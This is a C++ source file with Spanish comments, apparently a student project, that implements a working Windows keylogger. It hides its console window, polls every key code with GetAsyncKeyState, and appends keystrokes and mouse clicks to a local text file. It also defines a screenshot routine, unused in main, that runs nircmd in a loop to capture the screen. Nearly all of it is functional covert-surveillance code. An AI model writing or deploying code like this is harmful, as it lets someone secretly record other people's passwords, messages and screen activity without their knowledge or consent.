#include <iostream>
//permite crea la carpeta donde se alojara las capturas de pantalla
#include<direct.h>
//nos permite crear el textfile del keylogger
#include <fstream>
//cuenta con librerias de windows, nos permite trabajar con eventos del sistema
#include<windows.h>
#define keyfilename "C:/Users/LYKOS/Desktop/pooproject/projectcpp/keytextfile.txt"
using namespace std;

void screenshot(int,int,char*);

//Metodo iniciante del keylogger
int keyloggermain();

//Escribe enun textfile lo que se digite por el teclado
void writeFile(LPCSTR);
//revisa si la tecla presionada es una tecla especial, distinta a caracteres
void keystroke(int);

int main()
{
    //screenshot(10,1000,"C:/Users/LYKOS/Desktop/captura");
	keyloggermain();

    return 0;
}

void screenshot(int loop, int time, char * project_name)
{
     cout << "Iniciando captura ..." << endl;
     char cmd[1000];
     /* Crear carpeta con el nombre del proyecto */
     mkdir(project_name);

     /* Crear el comando para ejecutar nircmd y realizar la captura con la configuracion dada */
     sprintf(cmd, "nircmd.exe loop %d %d savescreenshot %s/~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png", loop, time, project_name);

     cout << cmd << endl;
     cout << "Capturando fotogramas ..." << endl;
     /* Ejecutar el comando del sistema */
     system(cmd);
     cout << "Fin de la captura." << endl;
}

int keyloggermain()
{
    //Oculta la ventana de la consola de windows
   /* HWND stealth;
    stealth=GetConsoleWindow();
    ShowWindow(stealth,SW_HIDE);
    */
       HWND stealth;
       AllocConsole();
       stealth=FindWindowA("ConsoleWindowClass",NULL);
       ShowWindow(stealth,0);


    unsigned char key;
    while(1)
    {
        Sleep(10);
        for (key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
                keystroke(key);
        }
    }

    return 0;
}
void writeFile(LPCSTR texto){
    ofstream archivo;
    archivo.open(keyfilename,fstream::app);
    archivo<<texto;
    archivo.close();
}
void keystroke(int key){

    switch (key)
    {
        case VK_LBUTTON:
            cout<<"CLIC IZQUIERDO";
            writeFile(" {LEFT MBUTTON} ");
            break;
        case VK_RBUTTON:
            cout<<"CLIC DERECHO";
            writeFile(" {RIGHT MBUTTON} ");
            break;
        case VK_MBUTTON:
            cout<<"CLIC MEDIO";
            writeFile(" {MIDDLE MBUTTON} ");
            break;
        case VK_TAB:
            cout<<" {TAB} ";
            writeFile(" {TAB} ");
            break;
        case VK_CONTROL:
            cout<<" {CTRL} ";
            writeFile(" {CTRL} ");
            break;
        case VK_MENU:
            cout<<" {ALT} ";
            writeFile(" {ALT} ");
            break;
        case VK_CAPITAL:
            cout<<" {CAPS LOCK} ";
            writeFile(" {CAPS LOCK} ");
            break;
        case VK_ESCAPE:
            cout<<" {ESC} ";
            writeFile(" {ESC} ");
            break;
        case VK_HOME:
            cout<<" {HOME} ";
            writeFile(" {HOME} ");
            break;
        case VK_END:
            cout<<" {END} ";
            writeFile(" {END} ");
            break;
        case VK_LEFT:
            cout<<" {LEFTARROW} ";
            writeFile(" {LEFTARROW} ");
            break;
        case VK_RIGHT:
            cout<<" {RIGHTARROW} ";
            writeFile(" {RIGHTARROW} ");
            break;
        case VK_UP:
            cout<<" {UPARROW} ";
            writeFile(" {UPARROW} ");
            break;
        case VK_DOWN:
            cout<<" {DOWNARROW} ";
            writeFile(" {DOWNARROW} ");
            break;
        case VK_SPACE:
            cout << " ";
            writeFile(" ");
            break;
        case VK_RETURN:
            cout << "\n";
            writeFile(" {ENTER} ");
            break;
        case VK_SHIFT:
            cout << " {SHIFT} ";
            writeFile(" {SHIFT} ");
            break;
        case VK_NUMLOCK:
            cout << " {NUMLK} ";
            writeFile(" {NUMLK} ");
            break;
        case VK_BACK:
            cout << " \t ";
            writeFile(" {RETROCESO} ");
            break;
        case VK_F7:
            exit(0);
            break;
        default:
            ofstream archivo;
            archivo.open(keyfilename, fstream::app);
            char ckey=key;
            archivo << ckey;
            archivo.close();
    }
}

